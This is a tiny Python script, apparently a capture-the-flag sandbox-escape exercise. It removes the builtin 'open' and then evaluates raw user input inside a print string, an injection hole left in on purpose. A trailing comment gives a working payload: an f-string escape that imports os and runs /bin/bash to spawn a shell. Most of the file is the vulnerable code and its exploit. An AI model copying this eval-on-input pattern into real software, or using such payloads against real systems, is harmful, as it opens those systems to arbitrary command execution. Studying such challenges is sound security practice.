#!/usr/bin/python3

del __builtins__.__dict__['open']

a = input()
eval("print('" + a + "')")

# payload 'f'{__import__("os").system("/bin/bash")}